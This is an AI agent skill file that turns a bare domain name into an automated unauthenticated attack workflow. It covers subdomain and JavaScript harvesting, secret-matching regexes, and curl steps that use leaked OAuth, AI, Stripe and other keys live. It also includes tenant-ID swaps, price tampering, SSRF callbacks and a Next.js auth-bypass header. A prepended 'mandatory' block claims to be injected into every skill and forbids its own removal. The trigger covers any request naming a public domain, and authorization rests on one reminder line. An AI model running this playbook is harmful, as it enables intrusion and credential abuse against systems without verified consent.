---
name: p1-unauth-recon-agent
description: >
  Elite unauthenticated P1/P2 bug-hunting agent that finds critical vulnerabilities from nothing but a target TLD via pure recon — no account, no credentials, no insider access. ALWAYS activate for: unauthenticated bug hunting, pre-auth vulnerability, "just give me a domain", "find P1 bugs on target.tld", "recon-only hunting", "no login required", subdomain takeover, mass PII leak, mass data exposure, exposed S3/GCS/Azure/DigitalOcean buckets, bucket takeover, Firebase / Firestore / Realtime Database misconfiguration, open Elasticsearch/MongoDB/Redis/CouchDB, cloud takeover, cloud account takeover, leaked AWS/GCP/Azure keys, leaked .env, IAM privilege escalation, Laravel APP_KEY RCE, exposed Jenkins/Kubernetes/Spring Actuator/Grafana/Kibana/Elasticsearch/MongoDB/Redis, .git/.env/.DS_Store exposure, source map leaks, GitHub/GitLab/Postman secrets leak, pre-auth RCE CVEs (Confluence CVE-2022-26134/CVE-2023-22515, Spring4Shell, Log4Shell, MOVEit, Citrix Bleed, GitLab, Atlassian, Fortinet, F5 BIG-IP, Telerik, Struts, Drupalgeddon, ImageMagick, SharePoint ToolShell CVE-2025-53770, Ivanti CVE-2025-0282, Citrix NetScaler, Palo Alto PAN-OS CVE-2024-3400, PHP-CGI CVE-2024-4577), unauthenticated SSRF, SSRF to cloud metadata / IMDS credential theft, unauth API BOLA/IDOR, GraphQL mass-PII, open redirect chains to OAuth ATO, CORS wildcard with credentials, cache poisoning, web cache deception, dependency confusion via public JS, origin IP disclosure / WAF bypass, default credentials on exposed services, dangling DNS, host header injection on password reset, SAML/OIDC misconfig from .well-known, public NPM packages with internal names, leaked API keys in JS bundles, exposed Swagger/GraphQL introspection, mass DNS subdomain enumeration, "give me bounties without auth", "P1 from TLD only", or ANY request to find critical vulnerabilities with zero authentication on a publicly-known domain. Full kill chain: TLD → DNS/cert → asset inventory → service fingerprint → CVE map → secret hunt → exposure scan → chain → PoC → report. Token-efficient. Authorized testing only.
---

<!-- MANDATORY-JS-RECON-DOCTRINE v3 — injected across EVERY skill. Do not delete or gate behind a condition. -->

# 🚨 MANDATORY JS RECON GATE — NO SKIP, NO EXCEPTIONS

**This block is law in every skill.** Whatever else this skill does, if a web/HTTP target is
anywhere in scope you MUST complete the JS recon pipeline below BEFORE you conclude recon,
rank surface, declare "nothing found," or move to the next phase. Skipping any step is a
**process failure, not an optimization.** There is no file-count exception, no time-pressure
exception, no "it's a small app / SPA / static site" exception.

> Client-side JS is the attack-surface map of the entire application. Every bundle, chunk,
> worker, source map, service worker, and inline script leaks endpoints, secrets, roles,
> feature flags, and business logic the server never meant you to see. Hunters who skip JS lose the P1s.

---

## RULE 1 — ALL crawlers are MANDATORY on EVERY live host — plus 3 new mandatory classes

Run **all five** tool-classes — never just one, never "pick your favourite." Enumerate subdomains
first, then run this per host (each subdomain ships its own bundle, secrets, and logic):

```bash
subfinder -d "$T" -all -silent | httpx -silent -mc 200 -o live_hosts.txt   # per-host, not per-apex

# PASSIVE (zero-touch history — catches dead/forgotten/rotated-but-still-live JS)
echo "$HOST" | waybackurls | anew all_urls.txt
echo "$HOST" | gau --subs  | anew all_urls.txt
echo "$HOST" | waymore -mode U -oU waymore.txt 2>/dev/null; cat waymore.txt | anew all_urls.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# ACTIVE (live DOM, dynamic <script>, chunk loads)
katana   -u "https://$HOST" -jc -jsl -d 5 -kf all -aff -silent | anew all_urls.txt
hakrawler -u "https://$HOST" -d 3 -subs 2>/dev/null              | anew all_urls.txt
gospider  -s "https://$HOST" -d 3 --js  2>/dev/null              | anew all_urls.txt
cariddi   -s "https://$HOST" -intensive 2>/dev/null | grep '\.js'| anew js.txt
awk '/\.js([?]|$)/' all_urls.txt | anew js.txt

# MANDATORY: Service Workers (often forgotten, contain cache logic + secrets)
curl -sL "https://$HOST/sw.js"              -o "js_files/sw.js"              2>/dev/null
curl -sL "https://$HOST/service-worker.js"  -o "js_files/service-worker.js"  2>/dev/null
curl -sL "https://$HOST/manifest.json" | jq -r '.service_worker // empty'   2>/dev/null
# Check Web App Manifest for SW registration path and parse its scope

# MANDATORY: Inline JS extraction from every HTML page (tools miss embedded <script> blocks)
python3 - <<'PYEOF'
import re, sys, requests
from bs4 import BeautifulSoup
HOST = sys.argv[1] if len(sys.argv)>1 else ""
for path in ['/', '/app', '/dashboard', '/admin', '/login']:
    try:
        r = requests.get(f"https://{HOST}{path}", timeout=10,
                         headers={"User-Agent":"Mozilla/5.0"})
        soup = BeautifulSoup(r.text, 'html.parser')
        for i, tag in enumerate(soup.find_all('script', src=False)):
            if tag.string and len(tag.string) > 100:
                fname = f"js_files/inline_{path.strip('/') or 'root'}_{i}.js"
                open(fname,'w').write(tag.string)
                print(f"[INLINE] {fname} ({len(tag.string)} chars)")
        # Also capture window.__NEXT_DATA__, window.__NUXT__, window.__remixContext
        for pat in [r'window\.__NEXT_DATA__\s*=\s*({.+?});',
                    r'window\.__NUXT__\s*=\s*(.+?)\s*;',
                    r'window\.__remixContext\s*=\s*({.+?});']:
            m = re.search(pat, r.text, re.DOTALL)
            if m: print(f"[SSR-STATE] {pat[:20]}... FOUND at {HOST}{path}")
    except: pass
PYEOF

# MANDATORY: Framework-specific chunk paths (lazy bundles tools never trigger)
# Next.js
curl -s "https://$HOST/_next/static/chunks/pages/_app.js" | head -5 | grep -q 'function' && \
  echo "[NEXT.JS] _next/ chunks present" && \
  katana -u "https://$HOST" -d 3 -silent | grep '_next/static' | anew js.txt
# Nuxt
curl -s "https://$HOST/_nuxt/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[NUXT] _nuxt/ chunks present"
# Vite
curl -s "https://$HOST/assets/" -o /dev/null -w "%{http_code}" | grep -q 200 && \
  echo "[VITE] /assets/ present"
```

**MANUAL CRAWL is equally mandatory — tools miss auth-gated and lazy-loaded routes:**
- Open the app in a real browser with **Burp/mitmproxy inline**. **Log in.**
- Click through **every** route, tab, modal, multi-step wizard, settings/admin area.
- Watch the Network panel: every `.js`, every XHR/fetch, every WebSocket frame, every chunk
  pulled on navigation goes into `js.txt` / the endpoint list. SPAs load chunks lazily — a
  route you never visited = a bundle you never saw = bugs you never found.
- Toggle every feature flag you can find and capture the JS that loads behind each one.
- Burp extensions **JS Miner** + **Param Miner** + **JS Link Finder** run passively — enable all three.
- **In DevTools → Application tab:** check Service Workers registered, Cache Storage entries
  (cached JS/API responses), and Local Storage / Session Storage for tokens and flags.
- **In DevTools → Sources tab:** look for webpack internal entries (`webpack://`) and
  source-mapped originals — these are readable even without fetching `.map` separately.

---

## RULE 2 — Recover, beautify, DEOBFUSCATE, and READ every file (never grep-only)

```bash
sort -u js.txt -o js.txt && mkdir -p js_files beautified recovered deobfuscated
xargs -a js.txt -P20 -I@ sh -c 'curl -sL -A "Mozilla/5.0" "@" -o "js_files/$(echo @ | md5sum | cut -c1-16).js"'
for f in js_files/*.js; do js-beautify "$f" > "beautified/$(basename "$f")"; done

# SOURCE MAPS = full original source (readable, real var names, internal paths). A 200 is game over.
while read u; do
  s=$(curl -so /dev/null -w "%{http_code}" "$u.map")
  [ "$s" = "200" ] && echo "$u.map"
done < js.txt | tee sourcemaps_found.txt
# Recover each: sourcemapper -url URL -output ./recovered/   OR  unwebpack  OR  webcrack
# For multiple: cat sourcemaps_found.txt | xargs -I@ sourcemapper -url "@" -output ./recovered/

# WEBPACK DEOBFUSCATION — webcrack handles packed/self-executing bundles and recovers modules
# Install: npm install -g webcrack
for f in beautified/*.js; do
  webcrack "$f" -o "deobfuscated/$(basename "$f" .js)/" 2>/dev/null && \
    echo "[WEBCRACK] deobfuscated: $f"
done

# OBFUSCATOR.IO / eval-packed code — detect and unwrap
grep -l 'eval(function(p,a,c,k,e,d)' beautified/*.js | while read f; do
  node -e "var x=$(cat $f); if(typeof x==='string') console.log(x)" > "deobfuscated/$(basename $f)" 2>/dev/null
done
# String array rotation / hex strings
grep -l 'String\["fromCharCode"\]\|\\x[0-9a-f]\{2\}' beautified/*.js | \
  xargs -I@ sh -c 'node -e "eval(require(\"fs\").readFileSync(\"@\",\"utf8\"))" 2>/dev/null > deobfuscated/$(basename @)'

# WEBPACK: pull the runtime bootstrap's chunk-id→hash map to enumerate LAZY chunks no crawler triggered
grep -oE '[0-9]+:"[0-9a-f]{6,}"' beautified/*runtime* beautified/*.js 2>/dev/null | head -100
# Reconstruct chunk URLs: <publicPath>/<chunkId>.<hash>.chunk.js and fetch each
# Next.js chunks: /_next/static/chunks/<id>.<hash>.js
# Vite chunks: /assets/<name>.<hash>.js
```

**Grep is a triage pass to prioritize — NEVER the analysis itself.** Grep finds `apikey` and
`fetch(`. It does not tell you a URL-upload feature silently proxies server-side (SSRF), or that
a role flag is set client-side and never re-checked. **Every beautified/deobfuscated file gets
read end to end, including service workers and inline scripts.** No exception — budget the time;
this step is supposed to be slow.

---

## RULE 3 — Hunt these in every file (the money list — v2 expanded)

Static-scan to triage, then READ to confirm. Scanners: `trufflehog filesystem js_files/`
(verifies live keys), `jsluice urls|secrets js_files/*.js`, `mantra -f js.txt`,
`SecretFinder -i <f> -o cli`, `LinkFinder -i beautified/ -o cli`, `xnLinkFinder`,
`nuclei -t http/exposures/ -l js.txt`, `retire.js --js`, `whispers --target js_files/`.

### Secrets / Tokens (expanded — AI era + SaaS full coverage)

**Cloud & Infrastructure**
- **AWS** `AKIA…` access key + `aws_secret` 40-char key
- **GCP** `AIza[0-9A-Za-z\-_]{35}` + service-account JSON blob (`"type":"service_account"`)
- **Azure** storage connection strings `DefaultEndpointsProtocol=https;AccountName=...;AccountKey=...`; SAS tokens `?sv=`; tenant ID + `client_secret` in MSAL/ADAL config blocks
- **Databricks** `dapi[a-zA-Z0-9]{32}`
- **Snowflake** `account=...;user=...;password=...` in connection strings
- **MongoDB Atlas** `mongodb+srv://user:pass@cluster`
- **Redis** `redis://:password@host:port`
- **SMTP** `smtp://user:pass@host` in nodemailer/transporter configs
- **PEM private keys** `-----BEGIN (RSA |EC )?PRIVATE KEY-----`

**AI / ML Providers**
- **OpenAI** `sk-[A-Za-z0-9]{48}` and project keys `sk-proj-[A-Za-z0-9_\-]{48,}`
- **Anthropic** `sk-ant-[A-Za-z0-9\-_]{95,}` — full Claude API key
- **HuggingFace** `hf_[A-Za-z0-9]{34,}` — model download + write access
- **Replicate** `r8_[A-Za-z0-9]{40}`
- **Groq** `gsk_[A-Za-z0-9]{52}`
- **Cohere** `[A-Za-z0-9]{40}` with `cohere`/`CO_API_KEY` context
- **Together.ai** `[A-Za-z0-9]{40}` with `together`/`TOGETHER_API_KEY` context
- **Mistral** `[A-Za-z0-9]{32}` with `mistral`/`MISTRAL_API_KEY` context
- **Perplexity** `pplx-[A-Za-z0-9]{48}`
- **Pinecone** API key in vector DB init (`new Pinecone({ apiKey: … })`)
- **Voyage AI** `pa-[A-Za-z0-9]{40}`

**Payments & Finance**
- **Stripe** `sk_live_[0-9a-zA-Z]{24,}` / `sk_test_…`; webhook secret `whsec_[A-Za-z0-9]{32,}`
- **Braintree** `access_token$production$[A-Za-z0-9]{32}`
- **Square** `sq0atp-[A-Za-z0-9_\-]{22}` (access) / `sq0csp-[A-Za-z0-9_\-]{22}` (client secret)
- **Plaid** `client_id` + `secret` in PlaidLink init config
- **PayPal** `client_id` + `client_secret` in SDK init

**Communication & Messaging**
- **Twilio** `AC[a-zA-Z0-9]{32}` Account SID + `SK[a-z0-9]{32}` Auth Token
- **SendGrid** `SG.[A-Za-z0-9_\-]{22}.[A-Za-z0-9_\-]{43}`
- **Mailgun** `key-[a-zA-Z0-9]{32}`
- **Mailchimp** `[a-zA-Z0-9]{32}-us[0-9]{1,2}`
- **Slack** `xox[baprs]-…` / webhook `hooks.slack.com/services/…`
- **Discord bot** `[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}`
- **Telegram bot** `[0-9]+:AAF[a-zA-Z0-9_-]{33}`
- **Pusher** `app_key` + `app_secret` + cluster inline in Pusher JS init

**Developer & SaaS Platforms**
- **GitHub** `ghp_[A-Za-z0-9]{36}` / `github_pat_[A-Za-z0-9_]{82}`; webhook secret `sha256=` signing key
- **Vercel** `vc_[A-Za-z0-9]{32,}` / `VERCEL_TOKEN`
- **Netlify** `netlify-[A-Za-z0-9\-_]{40}`
- **Shopify** `shpss_[A-Za-z0-9]{32}` / `shpat_[A-Za-z0-9]{32}`; webhook HMAC secret
- **Algolia admin key** `[A-Za-z0-9]{32}` with `adminApiKey` label
- **Mapbox** `sk.[A-Za-z0-9]{80,}`
- **Datadog** `DD_API_KEY` / `datadog-[A-Za-z0-9]{32}`
- **Intercom** `[A-Za-z0-9]{8}-[A-Za-z0-9]{4}-…` with `intercom` context
- **Okta** `SSWS [A-Za-z0-9]{42}` API token
- **Auth0** `client_secret` in SPA SDK init; management API token `v2/…`
- **New Relic** `NRAK-[A-Za-z0-9]{27}` license key
- **Sentry DSN** `https://[key]@[org].ingest.sentry.io/[id]` — reveals org, project, DSN secret
- **LaunchDarkly** `sdk-[A-Za-z0-9\-]{40}` server-side key (write access to flags)
- **Segment** write key `[A-Za-z0-9]{32}` with `analytics.load(` context

**Auth & Crypto**
- **JWTs** `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`
- **Basic auth blobs** `Authorization: Basic [A-Za-z0-9+/=]{20,}`
- **OAuth** `client_id` + `client_secret` pairs
- **Apple APNs** `.p8` private key + Team ID + Key ID in push notification config

**Firebase / Supabase / Realtime DBs**
- **Firebase config object** `apiKey`, `authDomain`, `projectId`, `storageBucket`, `messagingSenderId`, `appId` — reveals project, enables unauth REST probing even if the key itself is "public"
- **Supabase** `SUPABASE_ANON_KEY` / `SUPABASE_SERVICE_ROLE_KEY` (service role = full DB access)

**Cloudinary**
- `cloudinary://[api_key]:[api_secret]@cloud_name` in upload preset config

**WebRTC**
- `iceServers` config with `urls: turn:...` + `username` + `credential` — TURN server credentials, test for reuse

### Hidden / Internal / Staging Endpoints
Every endpoint in JS is an UNTESTED endpoint. Real payout pattern: `/api/v2/internal/users`
recovered from obfuscated JS → full user DB → $25k. Also hunt:
- **WebSocket/SSE** `ws://`, `wss://`, `/subscribe`, `/stream`, `/sse`, `/events` — WS endpoints
  skip HTTP auth middleware and are frequently unprotected
- **GraphQL subscriptions** `subscription {`, `/subscriptions`, `/graphql-ws`
- **Deprecated v1 APIs** when v2 added auth — the old version often still runs
- **`window.__NEXT_DATA__`** — Next.js SSR embeds server-side API responses verbatim in HTML;
  often contains auth tokens, session data, internal API base URLs, and user PII
- **`window.__NUXT__`** — same problem on Nuxt apps
- **`window.__remixContext`** — Remix loader data embedded in HTML

### Critical Architecture & Logic Findings (only readable, not greppable)

These are the findings that separate JS readers from JS greppers. No scanner catches these — you find them only by understanding the code.

**Internal attack surface expansion**
- Internal microservice URLs (`http://internal-api/`, `http://10.x.x.x/`, `grpc://`) → direct SSRF targets not reachable from outside
- Shadow API versions: `v0`, `beta`, `internal`, `legacy` paths referenced in code but absent from docs — old version often has no auth
- Admin/ops routes (`/admin`, `/internal`, `/ops`, `/debug`) with comments revealing auth requirements (or lack of)
- Lambda function URLs, API Gateway stage variables, Cloud Function names → direct invocation bypassing WAF/rate limit
- S3/GCS/Azure blob container names in upload/download logic → enumerate + test ACL misconfig
- gRPC service + method names → probe for exposed gRPC-web endpoints without auth
- Cloud account IDs, project IDs, tenant IDs → enumerate cross-tenant

**Auth & authz logic that breaks server-side**
- Client-side role checks (`if (user.role === 'admin')`) → call the endpoint directly with low-priv token; server may never re-validate → BFLA
- Feature flags controlling security controls (`if (flags.skipRateLimit)`, `if (!flags.enforceAuth)`) → send overridden flag value in request/cookie
- Environment detection: `if (process.env.NODE_ENV !== 'production') { skip2FA() }` → probe if staging logic bleeds into prod headers
- Multi-tenant switching: how `org_id`/`tenant_id` is set client-side → test with another tenant's ID → horizontal escalation
- Permission bitmask definitions client-side → craft value that grants escalated bits
- A/B test variant code that unlocks privileged UI or unguarded endpoints for a subset of users

**Business logic & price manipulation**
- Price, discount, shipping, tax calculation done client-side → send manipulated values directly to order endpoint
- Promo/referral/coupon code generation patterns → predictable? Brute-forceable?
- Payment flow state machine definition → identify step-skip to complete order without payment leg
- Quantity / negative-value handling in cart logic → test negative quantities for credit

**Token & crypto weaknesses (read the generation code)**
- Token generation using `Math.random()`, `Date.now()`, or short entropy → predictable; reproduce offline
- Client-side encryption with hardcoded IV or key → decrypt intercepted traffic offline
- Password hashing revealed: `md5(pass + salt)`, `sha1(pass)` → crack offline
- HMAC signing with client-visible secret → forge arbitrary signed requests
- JWT construction showing which claims are client-set and which the server skips validating

**Injection hints buried in logic**
- SQL fragments in ORM calls: `db.raw(userInput)`, `knex.raw(…)`, `sequelize.query(userInput)` → direct SQLi target
- GraphQL query/mutation definitions → identify sensitive fields, hidden resolvers not in introspection
- Template strings fed to eval or innerHTML: `` eval(`SELECT ${input}`) `` → confirmed injection sink
- Regex input validation patterns → find gaps, edge cases, Unicode bypasses

**CORS / postMessage / redirect bypass hints**
- `allowedOrigins` array → find weakest entry (wildcard subdomain? `null` origin accepted?)
- postMessage handler: `event.data[action]()` or `window[event.data.fn]()` without `event.origin` check → XSS pivot from any frame
- Redirect whitelist using `startsWith`: `url.startsWith('https://company.com')` → bypass with `https://company.com.evil.com`
- CORS logic: `if (allowedOrigins.includes(req.headers.origin))` — test `null` origin, `Origin: ` (empty)

**Recon amplifiers (fingerprint hidden features)**
- Analytics event names (`track('admin_panel_viewed')`) → enumerate hidden features/flows not linked in nav
- Error handler stack traces → reveals internal file paths, framework versions, DB query structure
- `console.log` / `console.debug` statements left in prod → tokens, IDs, internal state dumped to DevTools

### Client-Side Auth & Roles
`isAdmin`, `role === 'admin'`, `hasPermission`, `parseJwt`, `atob(token)`,
`localStorage.setItem('admin',…)`, `featureFlags`, `canAccess`, `tier === 'enterprise'`.
Any UI/route gated ONLY client-side → call the endpoint directly with a low-priv token.

### Hidden Routes & Feature Flags
Dump SPA router table (React Router / Vue Router / Angular / Next.js pages directory).
Visit admin/beta/internal routes the nav never links. Flip feature flags (`localStorage`,
`?feature=`, cookie, JSON config, LaunchDarkly/Statsig/Split client keys) to unlock
ungated functionality.

### DOM XSS Sinks
`innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `setTimeout("…")`,
jQuery `$()`, `.html()`, `dangerouslySetInnerHTML`, `v-html`, Angular `bypassSecurityTrustHtml`;
sources `location.hash/search/href`, `postMessage`, `document.referrer`, `window.name` → trace source→sink.

### Prototype Pollution
`__proto__`, unsafe `merge/extend/Object.assign(x.prototype…)`, query-string parsers,
`qs.parse`/`querystring.parse` feeding into merge → gadget chain to XSS/RCE.

### Cloud & 3rd-party Refs
`*.amazonaws.com`/`s3://`, `firebaseio.com`, `storage.googleapis.com`,
`*.blob.core.windows.net`, `cloudfront.net`, `*.digitaloceanspaces.com`,
`supabase.co`, `*.neon.tech`, `*.planetscale.com` → test misconfig + takeover.

### postMessage Without Origin Check
`addEventListener('message',…)` with no `e.origin` check → cross-origin data theft / DOM XSS.

### Dependency CVEs
Map bundled lib versions to OSV/Snyk (`retire.js`). One bundled vulnerable lodash / axios /
DOMPurify / jQuery / Next.js = your bug. **2025 critical:** Next.js CVE-2025-29927
(middleware auth bypass via `x-middleware-subrequest` header — any Next.js ≤ 15.2.2).

### Historical / Version Diffing
Pull OLD JS from Wayback, diff vs live. Secrets and endpoints "removed" from current JS are
frequently STILL LIVE server-side; forgotten APIs survive in old bundles.

### Obfuscation as a Red Flag
Heavy obfuscation (`eval(function(p,a,c,k,e,d)`, string arrays, hex strings, `_0x` var names)
signals the developer was trying to hide something. Deobfuscate with `webcrack` / `synchrony` /
`de4js` and READ — the payoff rate on obfuscated code is higher than on readable code.

---

## RULE 4 — Confirm dynamically, THEN it's a finding (kill false positives)

Nothing gets reported on a regex hit alone. Prove it live:
- **OAuth client creds** → mint a real token:
  `curl -sX POST https://apigw.$T/token -H "Authorization: Basic <BLOB>" -d grant_type=client_credentials`
  → `access_token` returned = confirmed High/Crit (can't rotate without breaking prod).
- **AI API key** → call the provider's identity/model-list endpoint:
  `curl -s https://api.openai.com/v1/models -H "Authorization: Bearer $KEY"` → 200 = live.
  `curl -s https://api.anthropic.com/v1/models -H "x-api-key: $KEY" -H "anthropic-version: 2023-06-01"` → 200 = live.
- **`window.__NEXT_DATA__`** → curl the page without JS (`curl -sL https://HOST/page`) and
  parse the JSON blob from the HTML — if it contains session tokens or user PII, that's a finding.
- **"Internal" endpoint** → hit it unauth / cross-tenant and diff the response.
- **Params from JS** → fuzz `debug=true`, `admin=1`, `callback=`, `redirect=` and JS-seeded names
  (`x8` / `Arjun` from bundle var names) against the endpoints they belong to.
- **DOM XSS** → drive source→sink in real headless Chrome (Playwright preferred over Selenium);
  screenshot the alert/exfil.
- **WebSocket endpoint** → connect with `wscat`/`websocat` without auth header; send a probe message.
- **Next.js middleware bypass** → add `x-middleware-subrequest: middleware:middleware:middleware`
  header to any request behind a Next.js middleware guard; 200/data = CVE-2025-29927 confirmed.
- Feed confirmed secret keys to the **jsmax** skill for exploitation; DOM-XSS / prototype-pollution
  gadgets to the **xss-hunter-agent** skill for payload crafting.

- **Race condition** → fire 20+ parallel requests simultaneously (curl `--parallel` / Python asyncio+aiohttp / Playwright multi-context); confirm with: multiple `200 OK` on one-time-use action, duplicate records, balance goes negative, two success responses for a single-use token. Build the script fresh per target — timing constraints differ per app.
- **Secret new patterns** → confirm with provider identity endpoint: Twilio `api.twilio.com/2010-04-01/Accounts/$SID.json` (Basic auth); Stripe `/v1/account`; Mailgun `/v3/domains`; Discord `/api/v10/users/@me`; Telegram `api.telegram.org/bot$TOKEN/getMe`; Databricks `/api/2.0/token/list`; Supabase service role → `supabase.co/rest/v1/` with `apikey:` header (returns full table data = confirmed)
- **Business logic / price manipulation** → capture the POST body, modify the price/quantity field, replay with curl; confirm server used the client value in response total
- **Internal URL SSRF** → hit it via a server-side parameter that makes the app fetch a URL; confirm with `interactsh` callback or timing difference
- **Multi-tenant ID swap** → repeat the request with a different org/tenant ID; confirm data returned belongs to the other tenant

**Only then write the report.** No "could potentially" — prove it or drop it.

---

## CAPABILITY MAP — what runs autonomously vs. needs human

| Finding class | Autonomous (find + PoC + confirm) | Notes |
|---|---|---|
| Secret in JS | ✅ Full | grep → curl identity endpoint → confirmed |
| Unauth API endpoint | ✅ Full | curl without auth → check data returned |
| CORS bypass | ✅ Full | curl with crafted Origin header |
| SSRF via internal URL | ✅ Full | curl + interactsh callback |
| JWT attack (alg:none, claim tamper) | ✅ Full | craft JWT → curl |
| GraphQL introspection + BOLA | ✅ Full | full query chain |
| Price / business logic manipulation | ✅ Full | modified POST body via curl |
| Redirect bypass | ✅ Full | curl -L with crafted URL |
| Feature flag abuse | ✅ Full | send overridden flag value |
| S3/GCS/Firebase unauth | ✅ Full | aws s3 ls / curl REST |
| Race condition | ✅ Full | curl --parallel / asyncio / Playwright multi-context (script built fresh per target) |
| DOM-XSS | ⚠️ Script provided | Drive with claude-in-chrome or Playwright — needs browser session |
| postMessage XSS | ⚠️ Script provided | Write exploit HTML; user loads it |
| Auth flow logic bugs | ⚠️ Needs session | Requires authenticated cookies/tokens from user |
| CAPTCHA-gated flows | 🚫 Human-in-loop | Firm boundary — user solves, automation continues |
| MFA bypass | 🚫 Needs real device | Requires live TOTP/SMS |
| Client-side crypto weakness | 🔍 Identify + explain | Code identified, math worked through manually |
| Deobfuscation | ⚠️ Tool-dependent | Requires webcrack/synchrony installed; check first |
| Prototype pollution | ⚠️ Script provided | Find sink + write PoC; browser execution needed |

---

# P1-UNAUTH-RECON-AGENT — Critical Bugs from Just a TLD

> **Scope reminder**: Confirm `target.tld` is in-scope for an active bug-bounty program / pentest engagement / CTF before any active probing. Many findings below are passive-discoverable, but PoCs require authorization.

---

## CORE PHILOSOPHY (read once)

1. **A TLD is more attack surface than you think.** From `target.tld` alone you can usually find 100–10,000 subdomains, 50+ tech stacks, dozens of exposed services, and at least one P1 within hours — if you know where to look.
2. **Unauth bugs are higher-impact by definition.** Every "no auth required" finding multiplies severity (CVSS AV:N/PR:N), and triagers fast-track them.
3. **The four highest-yield buckets, in order:**
   - **Exposure** (something internal facing the internet that shouldn't)
   - **Takeover** (dangling DNS, abandoned cloud resource, expired domain)
   - **Pre-auth CVE** (the asset runs a known-vulnerable version)
   - **Secrets** (credentials/tokens/keys leaked in public code or JS)
4. **Recon is the bug.** ~70% of unauth P1s are found in Phase 1–2 (recon + fingerprint) before you ever send an exploit payload.
5. **Verify before you celebrate.** A naked Jenkins login page is not a P1. A Jenkins with anonymous read on `/script` is. Always click through.
6. **Never exfil real data.** Read enough to prove impact (one record, one config key, one PII field) and stop.

---

## PHASE 0 — INPUT NORMALIZATION

You are given `target.tld` (e.g. `acme.com`). Normalize before working:

```
T=acme.com                       # primary TLD
APEX=$(dig +short $T NS | head -1) # confirm authoritative NS
ORG=$(whois $T | grep -iE 'organi[sz]ation|registrant')
ASN=$(whois -h whois.cymru.com " -v $(dig +short $T)" | tail -1)
```

Decide: is this a **single-product** TLD (one app, one host), a **corporate umbrella** (hundreds of subdomains), or an **infra-only** TLD (CDN/edge only)? The killchain differs.

---

## PHASE 1 — PASSIVE RECON (zero traffic to target)

Read `references/recon-passive.md` for full one-liners. Minimum viable harvest:

```bash
# Subdomains (multi-source, dedupe)
subfinder -d $T -all -silent -o subs.txt
amass enum -passive -d $T -silent >> subs.txt
curl -s "https://crt.sh/?q=%25.$T&output=json" | jq -r '.[].name_value' | tr ',' '\n' >> subs.txt
chaos -d $T -silent >> subs.txt
github-subdomains -d $T -t $GH_TOKEN >> subs.txt
cero $T >> subs.txt                     # cert-SAN-based, finds internal-looking hosts
sort -u subs.txt > subs.uniq

# Historical URLs (great for hidden/old endpoints)
gau --threads 10 $T > urls.gau
waybackurls $T > urls.wb
cat urls.* | grep -E '\.(json|xml|env|bak|swp|sql|zip|tar|gz|7z|log|pem|key)$' > juicy.urls

# Deleted != gone. Files pulled from the live host (404 now) frequently persist
# in the Internet Archive. For any interesting/old path, fetch the archived copy:
#   curl -s "http://archive.org/wayback/available?url=$T/path" | jq -r '.archived_snapshots.closest.url'
#   curl -sL "https://web.archive.org/web/2id_/https://$T/pyrt/results/pyrt-current.tar.gz" -o old.tgz
# Real case: proprietary BGP/ISIS routing-protocol source was 404 on the live
# server but fully downloadable via Wayback -> valid source-code-exposure finding.

# Public secrets under the org (high signal)
trufflehog github --org=$ORG --only-verified
gitleaks --repo-search $ORG
noseyparker scan github --org $ORG

# Public NPM/PyPI packages mentioning the org (dependency-confusion seeds)
npm search "@$ORG/" || npm search "$ORG"
pip search "$ORG"
```

**Decision gate — proceed to Phase 2 only when:**
- ≥1 subdomain list with ≥50 hosts (or all of them if the TLD is small)
- Historical URLs collected
- Org GitHub/GitLab presence enumerated

---

## PHASE 2 — ACTIVE FINGERPRINTING

```bash
# Probe alive + tech + IP + CNAME (CNAME is the takeover signal)
httpx -l subs.uniq -silent -status-code -title -tech-detect -ip -cname -cdn -json > probe.json

# Port scan unique IPs (top 1000, then deep on interesting ones)
awk '{print $NF}' probe.json | jq -r '.host' | sort -u > hosts.uniq
naabu -list hosts.uniq -top-ports 1000 -o ports.txt
nmap -sV -sC -p- --min-rate 5000 -iL hosts.uniq -oA nmap.deep

# Screenshot everything (visual triage is fast)
gowitness file -f subs.uniq -P shots/

# JS harvest + endpoint extraction
katana -list subs.uniq -d 5 -jc -kf all -aff -fs fqdn -o crawled.txt
cat crawled.txt | grep -E '\.js(\?|$)' | uniq > js.urls
mkdir -p js && cd js && wget -q -i ../js.urls && cd ..
linkfinder -i 'js/*.js' -o cli > js.endpoints
jsluice urls js/*.js
trufflehog filesystem js/ --only-verified  # secrets in JS

# Source maps (huge — full source disclosure)
grep -rE 'sourceMappingURL=' js/ | awk -F'=' '{print $NF}' > sourcemaps.txt
```

**HARD RULE:** linkfinder/jsluice/trufflehog above are a fast first pass for
secrets/endpoints — not the analysis. Every file in `js/` (already correctly harvested
across every subdomain in `subs.uniq`, not just the apex) must ALSO be beautified
(`js-beautify`) and read completely end to end before this phase is done. Regex can't
find a logic bug (a client-side role check never re-verified server-side, a URL field
that silently proxies through a server-side SSRF) because it doesn't match a keyword
pattern. No file-count exception, even across hundreds of files.

**Decision gate — what to attack first (route to phases 3.X):**
| Signal | Route |
|---|---|
| CNAME points to abandoned cloud provider | **3.1 Subdomain Takeover** |
| `.git/HEAD`, `.env`, `web.config`, `.DS_Store` reachable | **3.2 Source/Config Exposure** |
| Banner = Jenkins/Spring/Grafana/Kibana/ES/Mongo/Redis/Solr/Druid/Airflow/Argo/Consul/Etcd | **3.3 Exposed Services** |
| Title/tech matches known pre-auth CVE | **3.4 Pre-auth CVE** |
| AWS/GCS/Azure bucket reference in JS or HTML | **3.5 Cloud Storage** |
| `?url=`, `?image=`, `?callback=`, `?return_to=` unauth | **3.6 Unauth SSRF / Open Redirect** |
| `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` | **3.7 CORS Misconfig** |
| GraphQL endpoint with introspection on, unauth | **3.8 GraphQL Unauth** |
| Verified secret hit from trufflehog/gitleaks | **3.9 Live Secret** |
| Internal-named NPM/PyPI package in `package.json` of JS bundle | **3.10 Dependency Confusion** |
| Origin IP behind CDN guessable (cert SAN, historic DNS, favicon hash) | **3.11 WAF/Origin Bypass** |
| `firebaseio.com` / `AIza…` key / open ES(`:9200`)/Mongo(`:27017`)/Redis(`:6379`) | **3.13 Mass-PII Killchain** |
| `.env` 200 / `AKIA…`/`AIza…`/SA-JSON leaked / SSRF→IMDS / dangling bucket | **3.14 Cloud-Takeover Killchain** |
